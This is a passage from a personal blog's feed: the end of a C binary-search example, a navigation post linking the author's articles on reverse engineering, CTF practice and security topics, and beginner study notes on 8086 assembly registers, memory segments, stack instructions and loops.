class="string">"没有找到！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"找到了,index为:%d\n"</span>,index);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;呜呜呜笔试的痛，基础一定要打好啊！要不然就像我一样要把知识重新捡回来了。我大一学数据结构就是跟着郝斌老师学的，非常nice！&lt;a href=&quot;https://www.bilibili.com/video/BV11s41167h6?p=1&quot;&gt;【郝斌】数据结构入门&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;由于郝斌老师的视频不完整，所以我又找了 &lt;a href=&quot;https://www.bilibili.com/video/BV1nJ411V7bd?p=63&quot;&gt;数据结构与算法基础（青岛大学-王卓）&lt;/a&gt; 补上缺的那部分的知识。&lt;/p&gt;
&lt;p&gt;记笔记记到一半上来感慨一下，绝了姐妹们！温故而知新，我把之前学的知识串通起来了！&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://example.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>README</title>
    <link href="http://example.com/posts/77cd4175.html"/>
    <id>http://example.com/posts/77cd4175.html</id>
    <published>2022-04-11T05:27:33.039Z</published>
    <updated>2022-05-25T00:49:35.980Z</updated>
    
    <content type="html"><![CDATA[<p>由于之前手贱把整个博客给删了，导致现在这个博客里的文章排序非常混乱，本强迫症患者实在有点看不下去，用hexo的文章置顶插件也不太理想，所以干脆用此做个导航贴。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><ul><li><a href="https://v5le0n9.github.io/posts/79666db.html">数据结构</a></li><li><a href="https://v5le0n9.github.io/posts/d04bd5bc.html">操作系统</a></li><li><a href="https://v5le0n9.github.io/posts/e255a10a.html">计算机网络</a></li></ul><h1 id="Windows逆向"><a href="#Windows逆向" class="headerlink" title="Windows逆向"></a>Windows逆向</h1><ul><li><a href="https://v5le0n9.github.io/posts/de6e58e0.html">x86汇编基础</a></li><li><a href="https://v5le0n9.github.io/posts/33a085c7.html">OD使用教程</a></li><li><a href="https://v5le0n9.github.io/posts/e2d652c5.html">吾爱破解培训第一课——脱壳基础</a></li><li><a href="https://v5le0n9.github.io/posts/7cd35487.html">吾爱破解培训第二三课——去弹窗、主页锁定及DIY</a></li><li><a href="https://v5le0n9.github.io/posts/65ab04eb.html">吾爱破解培训第四课——去程序自校验</a></li><li><a href="https://v5le0n9.github.io/posts/bb44dc0.html">吾爱破解培训第五六课——解除程序重启验证，程序打补丁</a></li><li><a href="https://v5le0n9.github.io/posts/a4cc5112.html">吾爱破解培训第七课——常见的网络验证</a></li><li><a href="https://v5le0n9.github.io/posts/4b9d65e0.html">吾爱破解培训第八九课——深入浅出探讨脱壳细节</a></li><li><a href="https://v5le0n9.github.io/posts/efe98763.html">吾爱破解培训第十课——x64平台脱壳与破解实战</a></li><li><a href="https://v5le0n9.github.io/posts/f398dcca.html">吾爱破解学习指导教程</a></li><li><a href="https://v5le0n9.github.io/posts/784f7e1d.html">.Net逆向教程</a></li><li>一些刷题记录：<ul><li><a href="https://v5le0n9.github.io/posts/5a99a36.html">攻防世界 逆向高手进阶区</a></li><li><a href="https://v5le0n9.github.io/posts/5ada4708.html">吾爱破解2022春节——Windows中级题</a></li><li><a href="https://v5le0n9.github.io/posts/f4e89fa4.html">BUUCTF 逆向合集</a></li></ul></li><li><a href="https://v5le0n9.github.io/posts/4dec66bb.html">PE结构</a></li><li><a href="https://v5le0n9.github.io/posts/8ba499c5.html">逆向分析基础</a></li><li><a href="https://v5le0n9.github.io/posts/adc1352a.html">Windows PE病毒分类及感染方式</a></li><li><a href="https://v5le0n9.github.io/posts/5ec21076.html">勒索病毒中的加解密原理</a></li><li><a href="https://v5le0n9.github.io/posts/2d03ac3f.html">CVE-2019-0708漏洞复现及防御机制</a></li></ul><h1 id="Android逆向"><a href="#Android逆向" class="headerlink" title="Android逆向"></a>Android逆向</h1><ul><li><a href="https://v5le0n9.github.io/posts/6d8340c1.html">ARM汇编语言</a></li><li><a href="https://v5le0n9.github.io/posts/15be101a.html">Android逆向入门教程</a></li><li>一些刷题记录：<ul><li><a href="https://v5le0n9.github.io/posts/9f62af2.html">攻防世界 Android逆向合集</a></li><li><a href="https://v5le0n9.github.io/posts/8b4ac9a8.html">吾爱破解2022春节——Android中级题</a></li><li><a href="https://v5le0n9.github.io/posts/17c1c819.html">Bugku Android逆向合集</a></li></ul></li></ul><h1 id="高级语言"><a href="#高级语言" class="headerlink" title="高级语言"></a>高级语言</h1><ul><li><a href="https://v5le0n9.github.io/posts/8df0ec14.html">Java学习</a></li><li><a href="https://v5le0n9.github.io/posts/e39e2a4e.html">Python学习</a></li></ul><h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul><li><a href="https://v5le0n9.github.io/posts/498ab7d9.html">机器学习</a></li><li><a href="https://v5le0n9.github.io/posts/2670ba0d.html">感知机学习算法</a></li><li><a href="https://v5le0n9.github.io/posts/e955b133.html">k-近邻算法</a></li><li><a href="https://v5le0n9.github.io/posts/ea9b7d09.html">朴素贝叶斯算法</a></li></ul><h1 id="密码算法"><a href="#密码算法" class="headerlink" title="密码算法"></a>密码算法</h1><ul><li><a href="https://v5le0n9.github.io/posts/855b12c4.html">RSA算法</a></li><li><a href="https://v5le0n9.github.io/posts/6b338c34.html">Base系列算法</a></li></ul><h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><ul><li><a href="https://v5le0n9.github.io/posts/54924480.html">Web渗透</a></li><li>一些小游戏：<ul><li><a href="https://v5le0n9.github.io/posts/9589547b.html">黑客丛林之旅小游戏</a></li><li><a href="https://v5le0n9.github.io/posts/76c5464c.html">monyer闯关小游戏</a></li></ul></li></ul><h1 id="二进制安全"><a href="#二进制安全" class="headerlink" title="二进制安全"></a>二进制安全</h1><ul><li><a href="https://v5le0n9.github.io/posts/1c971db4.html">pwn基础入门</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;由于之前手贱把整个博客给删了，导致现在这个博客里的文章排序非常混乱，本强迫症患者实在有点看不下去，用hexo的文章置顶插件也不太理想，所以干脆用此做个导航贴。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>x86汇编基础</title>
    <link href="http://example.com/posts/de6e58e0.html"/>
    <id>http://example.com/posts/de6e58e0.html</id>
    <published>2022-04-11T05:16:29.411Z</published>
    <updated>2022-04-11T05:43:13.844Z</updated>
    
    <content type="html"><![CDATA[<p>很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。</p><span id="more"></span><h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><p>汇编指令是机器指令的助记符，同机器指令一一对应。</p><p>每一种CPU都有自己的汇编指令集。</p><p>CPU可以直接使用的信息在存储器中存放。</p><p>指令和数据没有任何区别，都是二进制信息。</p><p>存储单元从零开始顺序编号。</p><p>存储器的存储单元可以存储1B，即8个二进制位。微机存储器的容量是以<strong>字节</strong>为最小单位来计算的。</p><p>1B=8b, 1KB=1024B, 1MB=1024KB, 1GB=1024MB, 1TB=1024GB</p><p>地址总线：</p><ul><li>CPU是通过地址总线来指定存储单元的</li><li>地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址</li><li>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N，这样的CPU最多可以寻找2的N次方个内存单元(B)</li></ul><p>数据总线：</p><ul><li>CPU与内存或其他器件之间的数据传送是通过数据总线来进行的</li><li>数据总线的宽度决定了CPU和外界的数据传送速度，8根数据总线一次可传送一个8位二进制数据(即1B)</li></ul><p>控制总线：</p><ul><li>CPU对外部器件的控制是通过控制总线来进行的</li><li>有多少根控制总线就意味着CPU提供了对外部器件的多少种控制</li><li>控制总线的宽度决定了CPU对外部器件的控制能力</li></ul><h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2. 寄存器"></a>2. 寄存器</h1><p>内部总线实现CPU内部各个器件之间的连接，外部总线实现CPU和主板上其他器件的联系。</p><h2 id="2-1-通用寄存器"><a href="#2-1-通用寄存器" class="headerlink" title="2.1 通用寄存器"></a>2.1 通用寄存器</h2><p>AX, BX, CX, DX</p><p>以AX为例，数据18，二进制表示10010，小端序</p><div class="table-container"><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th>AX</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>15</td><td>14</td><td>13</td><td>12</td><td>11</td><td>10</td><td>9</td><td>8</td><td>7</td><td>6</td><td>5</td><td>4</td><td>3</td><td>2</td><td>1</td><td>0</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td></tr><tr><td></td><td></td><td>8~15</td><td>AH</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>0~7</td><td>AL</td><td></td><td></td></tr></tbody></table></div><p>AH和AL可以看成是一个字型数据的高8位和低8位，也可以看成是两个独立的字节型数据。</p><h2 id="2-2-几条汇编指令"><a href="#2-2-几条汇编指令" class="headerlink" title="2.2 几条汇编指令"></a>2.2 几条汇编指令</h2><img src="/posts/de6e58e0/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E4%B8%BE%E4%BE%8B.png" class="" title="汇编指令举例"><p>汇编指令不区分大小写。</p><p>原AX=0000H，BX=0000H</p><div class="table-container"><table><thead><tr><th>程序段中的指令</th><th>指令执行后AX中的数据</th><th>指令执行后BX中的数据</th></tr></thead><tbody><tr><td>mov ax, 4E20H</td><td>4E20H</td><td>0000H</td></tr><tr><td>add ax, 1406H</td><td>6226H</td><td>0000H</td></tr><tr><td>mov bx, 2000H</td><td>6226H</td><td>2000H</td></tr><tr><td>add ax, bx</td><td>8226H</td><td>2000H</td></tr><tr><td>mov bx, ax</td><td>8226H</td><td>8226H</td></tr><tr><td>add ax, bx</td><td><strong>044CH</strong></td><td>8226H</td></tr></tbody></table></div><h2 id="2-3-物理地址"><a href="#2-3-物理地址" class="headerlink" title="2.3 物理地址"></a>2.3 物理地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">物理地址=段地址×16+偏移地址=基础地址+偏移地址</span><br></pre></td></tr></table></figure><p>CPU可以用不同的段地址和偏移地址形成同一个物理地址。</p><p>偏移地址16位，变化范围0~FFFFH，仅用偏移地址来寻址最多可寻$2^{16}B=2^{6}KB=64KB$个内存单元。</p><h2 id="2-4-CS-和-IP"><a href="#2-4-CS-和-IP" class="headerlink" title="2.4 CS 和 IP"></a>2.4 CS 和 IP</h2><p>CS为代码段寄存器(存放段地址)，IP为指令指针寄存器(存放偏移地址)。</p><p>同时修改CS、IP的内容：jmp 段地址：偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 3:0B16执行后：CS=0003H,IP=0B16H,CPU将从00030H+0B16H=00B46H处读取指令</span><br></pre></td></tr></table></figure><p>仅修改IP的内容：jmp 某一合法寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp ax执行指令前：ax=1000H,CS=2000H,IP=0003H</span><br><span class="line">执行指令后：ax=1000H,CS=2000H,IP=1000H</span><br></pre></td></tr></table></figure><p>8086CPU工作过程：</p><ol><li>从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器</li><li>IP指向下一条指令</li><li>执行指令（转到1，重复）</li></ol><h1 id="3-内存访问"><a href="#3-内存访问" class="headerlink" title="3. 内存访问"></a>3. 内存访问</h1><p>字单元：存放一个字型数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位字节，低地址内存单元中存放字型数据的低位字节。</p><p>起始地址为N的字单元简称为N地址字单元。比如一个字单元由2、3两个内存单元组成，则这个字单元的起始地址为2。</p><h2 id="3-1-DS-和-address"><a href="#3-1-DS-和-address" class="headerlink" title="3.1 DS 和 [address]"></a>3.1 DS 和 [address]</h2><p>DS为数据段寄存器(存放段地址)，[address]表示一个内存单元(存放偏移地址)。</p><h2 id="3-2-mov指令-add、sub指令同"><a href="#3-2-mov指令-add、sub指令同" class="headerlink" title="3.2 mov指令(add、sub指令同)"></a>3.2 mov指令(add、sub指令同)</h2><ol><li>将数据直接送入寄存器：mov 寄存器，数据</li><li><p>将一个寄存器中的内容送人另一个寄存器：mov 寄存器，寄存器</p></li><li><p>将一个内存单元中的内容送入一个寄存器中：mov 寄存器，内存单元地址</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将10000H(1000:0)中的数据读到al中:</span><br><span class="line">mov bx, 1000H</span><br><span class="line">mov ds, bx</span><br><span class="line">mov al, [0]</span><br></pre></td></tr></table></figure><ol><li>mov 内存单元，寄存器</li><li>mov 段寄存器，寄存器</li></ol><p>8086CPU不支持将数据直接送入段寄存器的操作，ds是一个段寄存器，所以<code>mov ds,1000H</code>这条指令是非法的，只好用一个寄存器来进行中转，即先将1000H送入一个通用寄存器，再将通用寄存器的内容送入ds。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将al中的数据送入内存单元10000H中:</span><br><span class="line">mov bx, 1000H</span><br><span class="line">mov ds, bx</span><br><span class="line">mov [0], al</span><br></pre></td></tr></table></figure><h2 id="3-3-CPU提供的栈机制"><a href="#3-3-CPU提供的栈机制" class="headerlink" title="3.3 CPU提供的栈机制"></a>3.3 CPU提供的栈机制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ax 表示将寄存器ax中的数据送入栈中</span><br><span class="line">pop ax 表示从栈顶取出数据送入ax</span><br></pre></td></tr></table></figure><p>8086CPU的入栈和出栈操作都是以字为单位进行的。</p><p>CPU如何知道栈顶位置？SS:SP，任意时刻，SS:SP指向栈顶元素。</p><p>push ax由以下两步完成：</p><ol><li>SP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶</li><li>将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶</li></ol><p>pop ax由以下两步完成：</p><ol><li>将SS:SP指向的内存单元处的数据送入ax中</li><li>SP=SP+2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶</li></ol><h2 id="3-4-push指令-pop指令同"><a href="#3-4-push指令-pop指令同" class="headerlink" title="3.4 push指令(pop指令同)"></a>3.4 push指令(pop指令同)</h2><ol><li>将一个寄存器中的数据入栈：push 寄存器</li><li>将一个段寄存器中的数据入栈：push 段寄存器</li><li>将一个内存字单元处的字入栈：push 内存单元</li></ol><p>指令执行时，CPU要知道内存单元的地址，可以在push、pop指令中只给出内存单元的偏移地址，段地址在指令执行时，CPU从DS中取得。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">push [0];将1000:0处的字压入栈</span><br><span class="line">pop [2];出栈的数据送入1000:2处</span><br></pre></td></tr></table></figure><p>将10000H~1000FH这段空间当作栈，初始状态栈是空的，将ax, bx, DS中的数据入栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax;设置栈的段地址</span><br><span class="line">mov sp,0010H;设置栈的偏移地址,因栈为空,所以sp=000FH+0002H=0010H</span><br><span class="line">push ax</span><br><span class="line">push bx</span><br><span class="line">push ds</span><br></pre></td></tr></table></figure><p>push、pop等栈操作指令，修改的只是SP。也就是说，栈顶的变化范围最大为0~FFFFH</p><p>一个栈段的容量最大为64KB。</p><p>在10000H处写入字型数据2266H</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,2266H</span><br><span class="line">mov [0],ax</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,2</span><br><span class="line">mov ax,2266H</span><br><span class="line">push ax</span><br></pre></td></tr></table></figure><h2 id="3-5-段的综述"><a href="#3-5-段的综述" class="headerlink" title="3.5 段的综述"></a>3.5 段的综述</h2><p>对于数据段，将它的段地址放在DS中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当作数据来访问。</p><p>对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码中的指令。</p><p>对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当作栈空间来用。</p><p>CPU将内存中的某段内容当作代码，是因CS:IP指向了那里；CPU将某段内存当作栈，是因为SS:SP指向了那里。</p><h1 id="4-第一个程序"><a href="#4-第一个程序" class="headerlink" title="4. 第一个程序"></a>4. 第一个程序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,ax</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>在汇编语言程序中包含两种指令：伪指令、汇编指令。汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。伪指令没有对应的机器指令，最终不被CPU执行。伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。</p><h2 id="4-1-伪指令"><a href="#4-1-伪指令" class="headerlink" title="4.1 伪指令"></a>4.1 伪指令</h2><h3 id="4-1-1-XXX-segment-……-XXX-ends"><a href="#4-1-1-XXX-segment-……-XXX-ends" class="headerlink" title="4.1.1 XXX segment …… XXX ends"></a>4.1.1 XXX segment …… XXX ends</h3><p>segment和ends的功能是定义一个段，segment说明一个段开始，ends说明一个段结束。</p><p>一个有意义的汇编程序中至少要有一个段，这个段用来存放代码。</p><h3 id="4-1-2-end"><a href="#4-1-2-end" class="headerlink" title="4.1.2 end"></a>4.1.2 end</h3><p>end是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译。</p><h3 id="4-1-3-assume"><a href="#4-1-3-assume" class="headerlink" title="4.1.3 assume"></a>4.1.3 assume</h3><p>这条伪指令的含义为“假设”，它假设某一段寄存器和程序中的某一个用segment…ends定义的段相关联。通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。</p><h2 id="4-2-汇编指令"><a href="#4-2-汇编指令" class="headerlink" title="4.2 汇编指令"></a>4.2 汇编指令</h2><h2 id="4-3-标号"><a href="#4-3-标号" class="headerlink" title="4.3 标号"></a>4.3 标号</h2><p>一个标号指代了一个地址，比如“codesg”。codesg在segment前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。</p><h2 id="4-4-程序的结构"><a href="#4-4-程序的结构" class="headerlink" title="4.4 程序的结构"></a>4.4 程序的结构</h2><p>编程运算$2^3$</p><ol><li>定义一个段，名称为abc</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><ol><li>在这个段中写入汇编指令，来实现我们的任务</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><ol><li>指出程序要在何处结束</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>abc被当作代码段来用，所以应该将abc和cs联系起来</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>程序返回</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ol><li>语法错误和逻辑错误</li></ol><h2 id="4-5-编译"><a href="#4-5-编译" class="headerlink" title="4.5 编译"></a>4.5 编译</h2><p>源程序文件.asm-&gt;目标文件.obj</p><h2 id="4-6-连接"><a href="#4-6-连接" class="headerlink" title="4.6 连接"></a>4.6 连接</h2><p>目标文件.obj-&gt;可执行文件.exe</p><h1 id="5-bx-和loop指令"><a href="#5-bx-和loop指令" class="headerlink" title="5. [bx]和loop指令"></a>5. [bx]和loop指令</h1><p>[bx]同样表示一个内存单元，它的偏移地址在bx中。</p><p>“()”中的元素可以有3种类型：①寄存器名；②段寄存器名；③内存单元的物理地址。</p><p>(ax)表示ax中的内容，(20000H)表示内存20000H单元的内容，((ds)<em>16+(bx))表示ds中的内容为ADR1，bx中的内容为ADR2，内存ADR1\</em>16+ADR2单元的内容，即内存ADR1:ADR2单元的内容。</p><p>约定idata表示常量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[idata]</span><br><span class="line">mov ax,idata</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx];(ax)=((ds)*16+(bx))</span><br><span class="line">mov [bx],ax;((ds)*16+(bx))=(ax)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc bx;inc bx的含义是bx中的内容加1</span><br></pre></td></tr></table></figure><h2 id="5-1-loop指令"><a href="#5-1-loop指令" class="headerlink" title="5.1 loop指令"></a>5.1 loop指令</h2><p>loop指令的格式：loop 标号</p><p>CPU执行loop指令的时候要进行两步操作：</p><ol><li>(cx)=(cx)-1</li><li>判断cx中的值，不为零则转至标号处执行程序，为零则向下执行</li></ol><p>编程运算$2^{12}$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,2</span><br><span class="line">mov cx,11</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>cx和loop指令相配合实现循环功能：①在cx中存放循环次数；②loop指令中的标号所标识地址要在前面；③要循环执行的程序段，要写在标号和loop指令的中间。</p><p><strong>在汇编源程序，数据不能以字母开头</strong>，所以要在前面加0。<code>A000H</code>在汇编源程序中要写为<code>0A000H</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,[0];(al)=0,将常量0送入al中(mov al,0含义相同)</span><br><span class="line">mov al,ds:[0];(al)=((ds)*16+0),将内存单元中的数据送入al中</span><br><span class="line">mov al,[bx];(al)=((ds)*16+(bx)),将内存单元中的数据送入al中</span><br><span class="line">mov al,ds:[bx];与mov al,[bx]含义相同</span><br></pre></td></tr></table></figure><p>（1）在汇编源程序中，如果用指令访问一个内存单元，则在指令中必须用”[]“来表示存储单元，如果在”[]“里用一个常量idata直接给出内存单元的偏移地址，就要在”[]“的前面显式地给出段地址所在的寄存器。比如<code>mov al,ds:[0]</code></p><p>如果没有在”[]“的前面显式地给出段地址所在的段寄存器，那么编译器会把指令中的[idata]解释为data，比如<code>mov al,[0]</code></p><p>（2）如果在”[]“里用寄存器，比如bx，间接给出内存单元的偏移地址，则段地址默认在ds中。当然也可以显式地给出段地址所在的段寄存器。</p><h2 id="5-2-一段安全的空间"><a href="#5-2-一段安全的空间" class="headerlink" title="5.2 一段安全的空间"></a>5.2 一段安全的空间</h2><p>我们需要直接向一段内存中写入内容，这段内存空间不应存放系统或其他程序的数据或代码，否则写入操作很可能引发错误。DOS方式下，一般情况，0:200~0:2ff空间中没有系统或其他程序的数据或代码。</p><h2 id="5-3-loop和-bx-的联合应用"><a href="#5-3-loop和-bx-的联合应用" class="headerlink" title="5.3 loop和[bx]的联合应用"></a>5.3 loop和[bx]的联合应用</h2><p>在循环中，源始单元ffff:X和目标单元0020:X的偏移地址X是变量，可以用bx来存放。</p><h2 id="5-4-段前缀"><a href="#5-4-段前缀" class="headerlink" title="5.4 段前缀"></a>5.4 段前缀</h2><img src="/posts/de6e58e0/%E6%AE%B5%E5%89%8D%E7%BC%80.PNG" class="" title="段前缀"><h1 id="6-包含多个段的程序"><a href="#6-包含多个段的程序" class="headerlink" title="6. 包含多个段的程序"></a>6. 包含多个段的程序</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:add ax,cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>dw即define word，定义字型数据。</p><p>程序在运行的时候CS中存放代码段的段地址，所以可以从CS中得到它们的段地址。dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是cs:0, cs:2, cs:4, cs:6, cs:8, cs:a, cs:c, cs:e。</p><p>end除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。<code>end 标号</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 